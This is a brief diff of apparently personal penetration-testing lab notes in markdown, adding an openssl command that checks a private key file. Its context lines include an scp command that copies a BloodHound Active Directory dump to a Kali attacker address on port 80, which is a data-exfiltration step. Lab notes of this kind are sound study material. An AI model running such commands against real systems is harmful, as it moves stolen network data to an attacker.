@@ -48,3 +48,8 @@ sudo service ssh restart
 ```
 scp -P 80 20250425032703_BloodHound.zip kali@10.10.14.3:/home/kali/Desktop/20250425032703_BloodHound.zip
 ```
+### Privare Key
+Check
+```
+openssl rsa -in pkcs11.txt -check
+```
